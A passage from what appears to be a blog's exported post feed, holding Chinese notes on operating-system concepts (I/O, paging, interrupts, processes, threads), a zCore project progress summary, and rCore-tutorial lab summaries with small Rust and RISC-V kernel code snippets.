CPU访问总线较少，不用的时候可以给DMA用</li></ul></li><li>I/O通道 将I/O指令单独由通道包含处理器执行<ul><li>可控制多台不同类设备</li><li>流程：cpu遇到I/O，启动通道-cpu执行其他-通道完成后发出中断-CPU处理I/O 【并行】</li></ul></li></ul><p>总线</p><ul><li>单总线 ： 易于扩充。｜ 传输时延大，串行</li><li>传统三总线 ：CPU与I/O隔离，支持更多I/O设备 ｜ 没把I/O分开，速率差别大不幸</li><li>南北桥：支持不同速率I/O</li><li>通道多级总线：好</li></ul><p>从下至上 IO软件</p><ul><li><p>高效率，通用性</p></li><li><p>设备无关性，出错处理，同步/异步传输，缓冲技术</p></li><li><p>中断处理程序：检查设备状态寄存器，根据情况处理</p><ul><li>错：向上报告错误，重新执行</li><li>正常：唤醒等待进程，转换为就绪态</li><li>等待：有等待传输I/O，通知启动下一个I/O请求</li></ul></li><li><p>设备驱动程序</p><ul><li>逻辑I/O 转化为 物理I/O 操作</li><li>监督 是否 正确执行，纠错， 管理数据缓冲区</li><li>功能： 设备初始化，执行设备驱动例程，调用和执行中断程序</li><li>只处理一种设备，或一类紧密相关的设备</li><li>整体（不移植） ， 分层（移植，开销增加）</li></ul></li><li><p>独立于设备的I/O软件：适用所有设备，向用户层提供接口</p><ul><li>命名，保护，提供数据单位，缓冲，分配状态跟踪，错误处理报告</li></ul></li><li><p>用户空间的I/O软件</p><ul><li>库函数（用访管指令陷入内核，内核函数实现 I/O操作</li><li>Spooling 内核外的系统I/O</li></ul></li></ul><p>I/O缓冲</p><ul><li>解决速度不匹配</li><li>单缓冲：数据-缓冲区-用户区-应用程序 ｜ 写：用户区复制到缓冲区</li><li>双缓冲：一个供用户程序使用，另一个可继续输入输出</li><li>循环缓冲：链表</li></ul><p>设备独立性</p><ul><li>逻辑设备 - 物理设备 独立开，调用类而不是单个设备</li><li>提高灵活性，隔离性，</li><li>每类对应设备类表中的一栏</li></ul><p>磁盘</p><ul><li><p>T<del>a</del>=T<del>S</del>+1/2r+b/rN  </p><ul><li>Ta 存取时间 Ts 寻道时间，r磁盘旋转速度（转/秒），B传送字节数，N一个磁道中的字节数</li></ul></li><li><p>移动臂调度</p><ul><li>调度策略：先进先出（低效），最短查找时间优先（饥饿）</li><li>扫描算法：单向，双向，电梯调度（当前移动方向没有，反向有请求时，反向）</li></ul></li><li><p>旋转调度</p><ul><li>优化分布：循环排序；优化排列，交叉分布（读取有延迟），按柱面数据读写</li></ul></li></ul><p>虚拟设备：</p><ul><li>使用一类物理设备 模拟 另一类物理设备</li></ul><p>SPOOLing</p><ul><li>磁盘开辟输入井和输出井，有预输入程序，预输出程序，井管理程序</li><li>预输入：作业开始前数据预先输入磁盘缓冲区，省去启动输入设备时间</li><li>缓输出：输出存在缓冲区，作业执行完，再由操作系统成批处理</li><li>将 独占设备 变为共享设备 “假脱机真联机”</li><li>-（预输入）-输入状态 -（预输入完成）- 收容状态 -（作业调度，选中并创建进程）</li><li>执行状态（进程运行） -（作业调度，终止撤离）- 完成状态-（缓输出）-</li></ul><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p>段式程序设计- 段覆盖技术（不相关程序替换执行完代码）</p><p>复用 - 分区复用，页架复用</p><p>地址转换： 逻辑-物理 静态/动态</p><p>空间 分去配， 利用主存分配表</p><p>存储保护：权限，地址保护异常</p><p>存储扩充：对换技术（不运行进程调出），虚拟技术（只调入部分内容）</p><p>虚拟技术：随用随调入，容纳进程装入，主存负责进程执行，对用户透明</p><p>Cache：由SDRAM，联想存储器，地址转换部件，替换逻辑组成</p><ul><li>L1 ：数据缓存 和 指令缓存</li><li>L2 : 内置和外置</li><li>L3 : 多为外置</li></ul><p>存储管理基本模式</p><ul><li><p>单连续存储管理（不可虚拟）</p><ul><li>主存分为系统区，用户区</li><li>栅栏寄存器</li><li>静态重定位</li><li>适用单用户单任务</li></ul><p>固定分区存储管理：分区数量，大小固定，主存分配表，可动态重定位，有内存内零头</p><p>可变分区：已分配区表和未分配区表（链表），内存回收，移动分区（基于动态重定位）</p></li><li><p>段式存储管理</p><ul><li>逻辑地址：段号：单元号</li><li>段表项：始址，限长，标志位</li><li>共享：不同进程段表项指向同一个段基址 并加保护</li><li>虚拟存储：动态装入，与段覆盖不同，用户控制，OS不感知</li></ul></li><li><p>页式存储管理</p><ul><li>物理：页架 ｜ 逻辑：页 ｜ 可不连续 </li><li>页表：页 -  页架 一一对应</li><li>逻辑地址：《页号，单元号》</li><li>位示图：记录主存分配情况</li><li>共享：不同进程可以使用不同页号共享数据页，但必须使用相同页号共享代码页（否则JMP《页内地址》失效） </li><li>快表：Cache（联想存储器）中的部分页表</li><li>进程表：标记 进程，页表始址，页表长度</li></ul><p>虚拟存储：</p><ul><li>首次只把进程第一页装入 ：请求页式存储管理</li><li>扩充页表项：虚拟地址，实际地址，标志位</li><li>实现：CPU处理不在主存，缺页中断；OS处理吊入空闲页架或调出其他页</li></ul></li><li><p>段页式存储管理</p><ul><li>每一段不必占据连续存储空间，可离散存放在主存页架中</li><li>段表项：标志，页表长，页表始址</li><li>逻辑地址：段号，页号，单元号</li><li>快表无，查询过程：查段表得到页表，页号为偏移量，查到块号，+单元号得到物理地址</li></ul></li></ul><p>页面调度：</p><ul><li>缺页中断率：不成功访问/总访问</li><li>影响⬆️：可用页架数，页面大小 ，算法</li><li>OPT：优先淘汰下一次访问离这次最远的页面</li><li>FIFO：优先淘汰最先调入主存的那一页</li><li>LRU：优先淘汰最久未被访问</li><li>CLOCK：循环队列</li></ul><p>反置页表</p><ul><li><p>IPT：MMU用的数据结构</p></li><li><p>页表项：页架号代表序号，页号，进程标志符，标志位</p></li><li><p><strong>MMU</strong>通过哈希表把进程标识和虚页号转 换成一个哈希值，指向<strong>IPT</strong>的一个表目</p><p><strong>MMU</strong>遍历哈希链找到所需进程的虚页号， 该项的索引就是页架号，通过拼接位移便可生成物理地址</p><p>若遍历整个反置页表中未能找到匹配页表项，说明该页不在内存，产生缺页中断， 请求操作系统调入</p></li></ul><h2 id="中断-与-系统结构"><a href="#中断-与-系统结构" class="headerlink" title="中断 与 系统结构"></a>中断 与 系统结构</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><ul><li>用户程序可见寄存器：数据，地址（栈指针等）</li><li>控制与状态寄存器：PC，CC，标志位等</li><li>程序状态字 PSW，</li></ul><h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><ul><li>取指，译码，执行</li><li>特权指令（OS内核使用），非特权：用户可用</li><li>处理器模式：<ul><li>用户-内核 ： 系统调用，异常，响应中断</li><li>内核-用户 ： 中断返回指令</li></ul></li></ul><h3 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h3><ul><li>操作系统 “中断驱动”，中断是激活操作系统唯一方式</li><li>狭义中断（处理器之外中断），异常（运行指令中断），系统异常（系统调用）</li><li>中断系统：硬件子系统（中断响应），软件子系统（中断处理）</li><li>指令执行周期最后增加 响应中断操作</li><li>中断装置 ： 发现并响应中断<ul><li>处理器外的中断:由中断控制器发现和响应</li><li>处理器内的异常:由指令的控制逻辑和实现线路发现和响应，相应机制称为陷阱</li><li>Syscall: 处理器执行陷入指令时直接触发，相应机制称为系统陷阱</li></ul></li><li>中断控制器：控制 和 寄存器<ul><li>寄存器记录中断 ，指令处理最后检查寄存器</li></ul></li><li>陷阱 与 系统陷阱</li><li>中断响应过程：<ul><li>检查中断寄存器，是否该屏蔽，根据优先级选择</li><li>保存 PSW/PC 到 核心栈</li><li>转到 中断处理程序</li></ul></li><li>中断处理<ul><li>保护处理器状态</li><li>识别中断源</li><li>处理中断</li><li>恢复正常操作 - 返回中断进程 或 调整进程队列</li></ul></li><li>多中断处理： 屏蔽 ，优先级，嵌套（《=3，可能改变处理顺序）</li></ul><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>进程 ： 动态 ， 资源分配和调度的基本单位</p><p>包括：OS管理的数据结构P，内存代码C，内存数据D，通用寄存器信息R，程序状态字PSW</p><p>可再入程序：相同代码不同数据集，纯代码</p><p>不同时间中针对 同一个程序运行 形成两个不同的进程</p><p>进程状态：</p><ul><li><p>运行态，就绪态，等待态</p></li><li><pre><code class="mermaid">graph TDA(运行态) --&gt;|落选| B(就绪态)B(就绪态) --&gt;|选中| A(运行态)C(等待态) --&gt; |等待事件结束|B(就绪态)A(运行态) --&gt; |出现等待事件| C(等待态)</code></pre></li><li><p>挂起</p></li></ul><p>进程控制块 PCB：</p><ul><li>标识信息  - 现场信息（寄存器） - 控制信息</li></ul><p>进程映像（内存映像）： PCB，程序块，数据块，核心栈</p><p>进程上下文：用户级，寄存器，系统级</p><p>队列管理模块：进程管理核心模块</p><p>进程控制与管理：</p><ul><li>进程创建:进程表加一项，申请PCB并初始化， 生成标识，建立映像，分配资源，移入就绪队列<br>• 进程撤销:从队列中移除，归还资源，撤销标识， 回收PCB，移除进程表项<br>• 进程阻塞:保存现场信息，修改PCB，移入等待 队列，调度其他进程执行<br>• 进程唤醒:等待队列中移出，修改PCB，移入就 绪队列(该进程优先级高于运行进程触发抢占)<br>• 进程挂起:修改状态并出入相关队列，收回内存等资源送至对换区<br>• 进程激活:分配内存，修改状态并出入相关队列<br>• 其他:如修改进程特权</li></ul><h4 id="进程切换："><a href="#进程切换：" class="headerlink" title="进程切换："></a>进程切换：</h4><p>中断触发 ，压入PSW/PC</p><p>处理中断</p><p>被中断进程 保存值， 状态调整，加入队列</p><p>选中下一个进程</p><p>调整恢复，选中进程</p><p>中断返回，弹出PSW/PC</p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>单线程（进程）问题：进程切换开销大，进程通信开销大，限制了进程并发的粒度，降低了并行计算的效率</p><p>将进程 资源分配 和 系统调度分派执行分离开：</p><ul><li>进程 ： 系统资源分配 和保护的独立单位，不需频繁切换 （容纳进程映像，存取保护）</li><li>线程 ：系统调度和分配的基本单位，能轻松的被频繁地调度和切换<ul><li>具有：线程执行状态，受保护的上下文，独立程序指令计数器，执行堆栈，静态存储器（局部变量）</li><li>状态：运行，就绪，睡眠</li></ul></li></ul><p>并发多线程优点： 快速线程切换，减少系统管理开销，线程通信易于实现，并行程度提高，节省内存空间</p><p>KLT：内核调度方便，本身也可多线程，但是应用程序线程在用户态，控制权切换需要模式切换，开销大</p><p>ULT：节省模式切换开销，不打扰内核，程序管理；运行在任何OS；缺点：不能利用多处理器，引起进程堵塞</p><ul><li>可用 jacketing 程序 来决定 进程切换 或 传递控制权给另一个线程</li><li>内核只负责进程调度</li></ul><p>ULT：逻辑并行性 KLT：物理并行性</p><p>混合模式：多个ULT映射一些KLT</p><h2 id="处理器调度"><a href="#处理器调度" class="headerlink" title="处理器调度"></a>处理器调度</h2><p>高级调度：能否加入到执行的进程池中 （多新建 终止）</p><p>中级调度：决定主存中的可用进程集合 （带 挂起）</p><p>低级调度：决定哪个可用进程占用处理器执行 （原三态）</p>]]></content>
      
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zCore 第二阶段总结及规划</title>
      <link href="/2020/08/01/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93%E5%8F%8A%E8%A7%84%E5%88%92/"/>
      <url>/2020/08/01/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93%E5%8F%8A%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<p>本文是zCore 的第二阶段的总结以及对接下来工作的规划</p><a id="more"></a><h1 id="第二阶段-总结-及-规划"><a href="#第二阶段-总结-及-规划" class="headerlink" title="第二阶段 总结 及 规划"></a>第二阶段 总结 及 规划</h1><h3 id="计划和总结"><a href="#计划和总结" class="headerlink" title="计划和总结"></a>计划和总结</h3><h3 id="速度-（有点粗糙）-但是-快速迭代"><a href="#速度-（有点粗糙）-但是-快速迭代" class="headerlink" title="速度 （有点粗糙） 但是 快速迭代"></a>速度 （有点粗糙） 但是 快速迭代</h3><h3 id="VMO"><a href="#VMO" class="headerlink" title="VMO"></a>VMO</h3><p>主要的类型 ： </p><ul><li><p>VMObjectPaged : 主要的VMO ， 掌控一组物理页面</p><ul><li>父节点</li><li>掌控的物理页面</li><li>映射关系</li><li>标志位  <strong>高速缓存策略</strong>  <strong>pin_count</strong> 等</li></ul></li><li><p>VMObjectPhysical ：代表一段连续物理内存</p></li><li><p>VMObjectSlice : 物理内存切片</p></li></ul><p>树状结构 ：</p><ul><li>利用 父节点的 偏移量 和 页面限制来实现</li></ul><img src="https://github.com/dingiso/DailySchedule/blob/master/img/VMObject.png?raw=true" alt="VMObject图片介绍"  /><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><h3 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h3><p>完善 <code>VMO</code> 部分的 <strong>单元测试</strong></p><h3 id="简化"><a href="#简化" class="headerlink" title="简化"></a>简化</h3><p>对树结构的 简化</p><p>包括 曾经， <strong>copy_on_write</strong>  利用 一位标志位实现，并调整可读写为，实现不可写，最终在 pagefault的时候在进行 <strong>copy</strong></p><p><strong>到</strong></p><p>直接 <strong>copy</strong></p><h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>shell 部分 可能有一些 VMO 部分的bug需要，在<code>zCore</code> 整体了解后，de这部分的bug</p><h3 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h3><p>总觉得 Tutorial 对于 学生的理解有点生涩<br>我的计划是按照学长的计划</p><ul><li>PPT 或 视频<strong>报告</strong> </li><li>基础知识的介绍</li><li>代码 和 测试的编写</li><li>总结</li></ul><h2 id="时间计划"><a href="#时间计划" class="headerlink" title="时间计划"></a>时间计划</h2><p><strong>8.15-30</strong> 期末考试，希望作为时间分配，逐渐慢慢推进</p><p><strong>9.1 号之后</strong> 我的目标仍然还是希望继续进行 zCore-Tutorial 可能就是设计 zCore-Tutorial 实验，争取开肝 <strong>zCore-Tutorial v2</strong> </p><h2 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h2><ul><li><code>debug</code> 过程中可能遇到不可知的难度</li><li><code>Tutorial</code> 编写过程中，希望能 以个人为单位，自己完成zCore 整体的复现，可能会遇到问题</li><li>等等</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> risc-v </tag>
            
            <tag> OS </tag>
            
            <tag> zCore </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rCore-tutorial 总结文档</title>
      <link href="/2020/07/25/rCore-tutorial%E6%80%BB%E7%BB%93%E6%96%87%E6%A1%A3/"/>
      <url>/2020/07/25/rCore-tutorial%E6%80%BB%E7%BB%93%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="lab-简单总结"><a href="#lab-简单总结" class="headerlink" title="lab 简单总结"></a>lab 简单总结</h3><p>本文是对rCore-tutorial第一阶段的6个lab的总结文档，简单概括了每个lab的内容和作用</p><a id="more"></a><h2 id="lab-0-简单总结"><a href="#lab-0-简单总结" class="headerlink" title="lab-0 简单总结"></a>lab-0 简单总结</h2><ol><li>为了借用新的特性 nightly</li><li>std 依赖操作系统 <code>#![no_std]</code> 禁用</li><li><code>panic_handler</code> 也在std库中，但是在运行过程中必须实现，所以我们自己写一个</li><li>异常时是要通过堆栈反向<strong>捕获异常</strong>并<strong>清理现场</strong>的，暂时不需实现，所以panic直接终止</li><li><code>main</code>函数并不能作为操作系统入口，所以我们用<code>_start</code> 函数代替，并利用 <code>extern &quot;C&quot;</code> 和 <code># [no_mangle]</code> 来使得他成为入口函数</li><li>通过改变链接器参数，使得程序编译成不依赖其他运行时环境的裸机目标</li><li>对于一个OS内核，他的起始地址和普通程序不同，在高地址上，通过更改-链接脚本</li><li>通过更改链接脚本使得，内核放在正确的地址上，并依次按顺序排放，<code>_start</code> 在先.</li><li>内核运行还需要环境支持，所以我们用汇编重写<code>_start</code> ，分配启动栈，并跳转到内核入口</li><li>将汇编代码内联到<code>main.rs</code>中，并更改内核入口为<code>rust_main</code></li><li>建立<code>Makefile</code> 保存编译运行参数，方便直接调用运行</li><li>OpenSBI 所提供的<code>SBI</code>调用参数 <strong>0-8</strong> ，为我们提供操作操作系统的基本功能</li><li>输出功能利用<code>core</code>中的输出函数调用<code>SBI</code>的单字符输出，并利用<code>println</code>等宏进行封装</li><li>完善 <code>panic</code> 和 <code>abort</code> 功能</li></ol><h2 id="lab-1-简单总结"><a href="#lab-1-简单总结" class="headerlink" title="lab-1 简单总结"></a>lab-1 简单总结</h2><ol><li><p>中断处理首先要保存上下文(即寄存器)在栈中,并在中断后恢复,分为两部分: </p><ul><li>context :通用32个寄存器,保存触发中断的指令地址<code>sepc</code>和系统状态的<code>sstatus</code></li><li>单列 :保存中断主要信息和原因的 <code>scause</code> 和 <code>stval</code>,因为后面需要使用所以单独</li></ul></li><li><p>利用汇编将寄存器的值存储在栈中,注意栈寄存器<code>sp</code>就是<code>x2</code>,所以需要空出他</p></li><li><p>利用 <code>STIE</code> 位开启时钟中断,利用 <code>sstatus</code> 的 <code>SIE</code> 位,允许内核态被中断打断</p></li><li><p>通过<code>sbi_call</code> 可以预约下一次的时钟中断,<code>time</code>参数就是中断时间</p></li><li><p>总结 时钟中断的调用过程</p><img src="https://github.com/dingiso/DailySchedule/blob/master/img/TimeInterrupt.png"  alt="时钟中断" />## lab-2 简单总结</li><li><p>对于动态内存分配，我们需要实例一个<code>堆</code>对象，而这个对象必须具有以下特征</p><ul><li>实现 <code>Trait GlobalAlloc</code> 的分配功能<ul><li>实现 <code>alloc</code> 和 <code>dealloc</code> 函数  ， 要求分配连续<code>size</code>大小，满足<code>align</code>对齐</li></ul></li><li>使用语义项<code>#[global_allocator]</code>进行标记</li></ul><p>编译器便会自动使用我们提供的内存分配函数</p></li><li><p>先开辟一个<code>u8</code>数组，将首地址和长度付给我们定义好的堆对象即可</p></li><li><p>探寻内核使用的结尾地址，<code>linker.ld</code> 说明了结尾地址为 <code>kernel_end</code> 我们将此函数实现，并将他的地址 作为 <code>usize</code> 输出皆可。</p></li></ol><h4 id="物理页的管理与分配"><a href="#物理页的管理与分配" class="headerlink" title="物理页的管理与分配"></a>物理页的管理与分配</h4><ol><li><p>页首地址满足 4kB 的倍数 ，页号 x4096 = 页首地址</p></li><li><p>分配的地址不存在堆或栈中，我们利用<code>FrameTracker</code>封装，实现类似于<code>Box</code> 的智能指针的相关特性，相当于我们对<strong>页</strong>实现了以下操作：</p><ul><li>封装了 <code>&amp;&#39;static mut</code> 类型的引用</li><li>提供了 <code>Drop</code> 函数，存在生命周期，超出后自动析构</li><li>需要引用计数则外面封装 <a href="alloc::sync::Arc"><code>Arc</code></a> </li></ul></li><li><p>针对所有的物理页，我们实现了一个物理页分配器封装对页的操作</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">static</span> <span class="token keyword">ref</span> <span class="token constant">FRAME_ALLOCATOR</span><span class="token punctuation">:</span> <span class="token class-name">Mutex</span><span class="token operator">&lt;</span><span class="token class-name">FrameAllocator</span><span class="token operator">&lt;</span><span class="token class-name">AllocatorImpl</span><span class="token operator">>></span> <span class="token operator">=</span> <span class="token class-name">Mutex</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">FrameAllocator</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Range</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token class-name">PhysicalPageNumber</span><span class="token punctuation">::</span><span class="token function">ceil</span><span class="token punctuation">(</span><span class="token class-name">PhysicalAddress</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token constant">KERNEL_END_ADDRESS</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">..</span><span class="token class-name">PhysicalPageNumber</span><span class="token punctuation">::</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token constant">MEMORY_END_ADDRESS</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><code>Mutex&lt;FrameAllocator&lt;AllocatorImpl&gt;&gt;</code></strong> </p><ul><li><p><code>Mutex</code>对分配器加锁防止多个线程访问，</p></li><li><p><code>FrameAllocator</code> 为主要分配器，</p></li><li><p><code>AllocatorImpl</code> 为分配器算法。</p></li></ul><p><code>PhysicalPageNumber::ceil(PhysicalAddress::from(*KERNEL_END_ADDRESS))..PhysicalPageNumber::floor(MEMORY_END_ADDRESS)</code></p><p>分配器分配的内存范围从 <code>kerne_end</code> 结束（上取整）开始到 我们可访问内存的最后的（下取整）</p></li><li><p>分配器算法利用的是实际物理页和起始地址的偏移量</p></li></ol><h2 id="lab-3-简单总结"><a href="#lab-3-简单总结" class="headerlink" title="lab-3 简单总结"></a>lab-3 简单总结</h2><h3 id="基础内容-关于页表"><a href="#基础内容-关于页表" class="headerlink" title="基础内容 - 关于页表"></a>基础内容 - 关于页表</h3><h3 id="首先：-为什么要用到虚拟地址？"><a href="#首先：-为什么要用到虚拟地址？" class="headerlink" title="首先： 为什么要用到虚拟地址？"></a>首先： 为什么要用到虚拟地址？</h3><p>简单理解，这是为了方便程序编写者的一种方法。比如我的程序想要运行在这个操作系统上， 我希望不需要考虑操作系统的实际内存情况，难道我还要看一下操作系统的代码，或翻一下手册么？ ， 我希望我的程序用的就是从 <code>0x1</code> 开始的连续地址，那么这个 <code>0x1</code> 就是虚拟地址。</p><h3 id="页表："><a href="#页表：" class="headerlink" title="页表："></a>页表：</h3><p>但是在操作系统中，实际运行时是需要使用实际物理地址的，那么我们如何推算物理地址呢，我们可以将这种（虚拟地址-物理地址）看作一种函数（映射）关系<br><code>f (虚拟地址）= 物理地址</code> 在存储时 就有了两种储存的方法，</p><ol><li>第一种 我们将这个 <code>f</code> 函数（简单理解是个线性的）关系储存下来 - 也就是 最开始<a href="https://rcore-os.github.io/rCore-Tutorial-deploy/docs/lab-3/guide/part-2.html">修改内核</a> 中使用的方法， 只需要统一加一个 偏移量即可。</li><li>第二种 我们将每一个 （虚拟地址-物理地址） 也就 (x,y) 按对存储起来，通过查找 虚拟地址，便能获得相应的物理地址。</li></ol><p>第二种方法便是我们所说的页表 ， 他是一（多）张，存储这种关系的表，通过查表便能完成 查找物理地址的任务。</p><blockquote><p>而且，虚拟地址也是对物理的地址的一种封装方法，可以实现内核对物理地址的权限管理，也就是我们在页表项的标志位，假设我不希望系统内核所在的地址被其他人写入其他内容，我只需要在页表项上</p></blockquote><h3 id="多级页表："><a href="#多级页表：" class="headerlink" title="多级页表："></a>多级页表：</h3><p>这种方法主要是为了节省内存，同时可以方便我们不用跨物理页去查询这张表。那么他为什么可以节省内存呢？<br><strong>举个小栗子：</strong> 内核代码在虚拟地址里 是 <code>0xffffffff80200000</code> ， 在实际物理地址是 <code>0x80200000</code> ， 在普通页表中我要这么存储， <code>(0xffffffff80200000,0x80200000,flag)</code> 这样的。同样在表示内核以 0xffffffff 开头的虚拟地址还有很多，这样会无形中增加很多的空间开销，但我们知道不断存储 <code>0xffffffff</code> 是冗余的。所以我们利用分级的方法，可以把页表变成下面的形式（理解方法）：</p><ul><li>二级页表 <code>（0xffffffff（虚拟地址的高位），存储下面一级页表的物理页号（首地址） ）</code></li><li>一级页表 <code>（0x80200000（低位），0x80200000（物理地址））</code><br>通过二级页表查找到一级页表的存储位置，再通过低位找到对应的物理地址。</li></ul><p><strong>那么</strong>我们实际上对于所有 以开头 <code>0xffffffff</code> 开头的虚拟地址，二级页表中永远只有一个页表项，这就节省了原来每次都要把他写上的空间。</p><h3 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h3><ol><li><p> 更改 linker.ld 的数据存放起址改为虚拟地址，并在各字段加入对齐，使得一个虚拟页不会有两个段。目的是为了可以对每一个段赋予不同的属性</p></li><li><p>entry.asm 中利用  下面代码使得 CPU模式 变为 Sv39</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 8 &lt;&lt; 60 是 satp 中使用 Sv39 模式的记号    li t1, (8 &lt;&lt; 60)    or t0, t0, t1    # 写入 satp 并更新 TLB    csrw satp, t0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>给出内核使用线性映射的偏移量 并 在 entry.asm 中 建立一个boot_page_table 作为初始页表，</p><ul><li>第一个映射是 0x8000_0000 -&gt; 0x8000_0000 VPN3 是 10B 所以放在第三位</li><li>第二个映射是 0xffff_ffff_8000_0000 -&gt; 0x8000_0000 VPN3 是 111111110B 所以放在 510位</li><li>保存第一个映射是违反规则的，但是为了执行 这个asm内的代码，所以要存在这个映射。</li></ul></li><li><p>将虚拟地址 分为 <code>0..9 的VPN1</code> <code>9..18的VPN2</code> <code>18..27的VPN3</code></p></li><li><p><strong>页表项  ：PageTableEntry = 标志位+页号</strong>   |对 物理页号进行封装</p></li><li><p><strong>页表 ：PageTable</strong> |装满一个物理页的页表项数组</p></li><li><p><strong>页表智能指针：PageTableTracker</strong> 因为页表太大了，所以利用上文提供的工具 <code>FrameTracker</code> ，将这个页表当成一个物理页看待，利用“智能指针”对其进行操作。</p></li><li><p><strong>内存段：Segment</strong> |在很多情况下虚拟页的单位量级太小了，我们对内存的管理可能一次涉及很多页，为了简化操作，我们将很多虚拟页统一封装为一个<code>Segment</code>，它具有以下属性</p><ul><li>两种简单的映射类型 ： 线性映射 和 每一帧都有映射</li><li>映射到的一块连续的虚拟地址</li><li>统一的权限标识</li></ul></li><li><p><strong>实际应用的映射关系：Mapping</strong> | 完成了基础的结构定义，那么我们该实际的对每个线程的映射关系进行封装并完成实际的操作和结构了：</p><ul><li>保存了 页表向量 ， 根页表物理页号， 映射信息</li><li><code>find_entry()</code> 实现 给定虚拟页号查找物理页号</li><li><code>map()</code> 实现了实际数据（未写入页中）的写入并构建映射<ul><li>线性则利用 我们<code>address.rs</code> 中规定的方式直接转换</li><li><code>Framed</code> 则 分割数据 ， 更新页表，写入物理页， 将映射关系写入映射</li></ul></li><li><code>activate()</code> 实现了将页表起使地址写入<code>satp</code> ，使用<code>Sv39</code>模式并 刷新<code>TLB</code></li></ul></li><li><p><strong>实现内核的重映射 ：MemorySet</strong> ： 利用我们工作替代原来的蛮夷，</p></li></ol><h2 id="lab-4"><a href="#lab-4" class="headerlink" title="lab-4"></a>lab-4</h2><ol><li><p><strong>线程：Thread</strong> | 线程是我们关注的实际<strong>执行代码的单位</strong>，教程的定义包括</p><ul><li><p>线程 ID  - 唯一标识线程的身份</p></li><li><p>线程的栈 - 线程占有一段的虚拟空间来进行利用</p></li><li><p>所属的进程</p></li><li><p>代表自身情况的可变变量（<code>Mutex</code>）- 包括 运行上下文，是否休眠，结束等属性 ， </p><blockquote><p>利用 <code>Mutex</code> 来包装使得 <code>Arc&lt;Thread&gt;</code> 保存的线程中的这些值可以被我们使用。</p></blockquote></li></ul></li><li><p><strong>进程： Process</strong> | 资源调度的基本单位，只需要保存自身属性和 线程共享页表，内存空间即可</p><ul><li>属于 用户态 还是 内核态</li><li>共用的 一块 内存空间，页表</li></ul></li><li><p><strong>线程管理器：Processor</strong> | 存放和管理所有的线程，主要包括：</p><ul><li>正在执行的线程</li><li>调度器 对线程实现调度，包括线程的添加，移除，进行下一个</li><li>休眠线程-处于等待状态的一些线程</li></ul><p>实现全局的，由<code>Lock</code>封装的管理器，我们利用<code>Mutex</code>和 <code>关闭时钟中断</code>  保证他一直在线</p></li><li><p>通过设置<code>Context</code>进行一个小的实验，进行验证并执行</p><ul><li><code>mv sp a0</code>  ,  通过 <code>__restore</code> 传入一个参数-即我们精心涉及的<code>Context</code></li><li>原来我们是在实验中为了验证中断而开启了中断，现在我们将其放在了线程开始时</li></ul></li><li><p><strong>中断处理</strong> ： |   线程切换实际为时钟中断的过程，我们需要在中断处理时完成切换</p><ul><li>定义的管理器<code>PROCESSOR</code>完成当前线程的 上下文 的保存</li><li>管理器为我们分配下一个应该调用的进程，并将他的上下文返回 通过 <code>__restore</code> 转换<ul><li> 如果没有下一个线程，则启动休眠线程，都没有则退出</li></ul></li></ul></li><li><p><strong>线程的结束：</strong>| 通过设置 <code>ra</code> 时线程顺利结束 </p><ul><li>原来线程结束触发<code>Exception::InstructionPageFault</code>  ，跳转 <code>0x0</code></li><li>通过触发中断，通知操作系统进行释放，<code>ecall</code> 调用 <code>ebreak</code></li><li>将中断包装在结束函数中，标记线程结束，并设置线程结束的 <code>ra</code></li></ul></li><li><p><strong>内核栈：</strong> | 但发生中断时，会切换到内核态，原来用于处理中断的<code>sp</code>指针需要一个内核栈，专门用于在内核态执行函数 - 防止线程的崩溃导致操作系统的崩溃</p><ul><li><p>只需要一个内核栈，因为只有中断时使用内核栈，而不会有两个线程同时中断</p></li><li><p>内核栈的地址不能放在通用寄存器中，而<code>sscratch</code>只有内核态能访问，比较合适</p></li><li><p>实际的做法: 定义<code>kernel_stack</code>分配空间，<code>interrupt.asm</code>中对<code>sscratch</code>操作</p><ul><li><p>为内核栈分配一段空间</p></li><li><p>运行线程时，将内核栈指针保存在<code>sscratch</code>寄存器中</p></li><li><p>中断时，则从将 <code>Context</code> 压入 <code>sscratch</code> 指向的栈中（<code>Context</code> 的地址为 <code>sscratch - size_of::&lt;Context&gt;()</code>），同时用新的栈地址来替换 <code>sp</code>（此时 <code>sp</code> 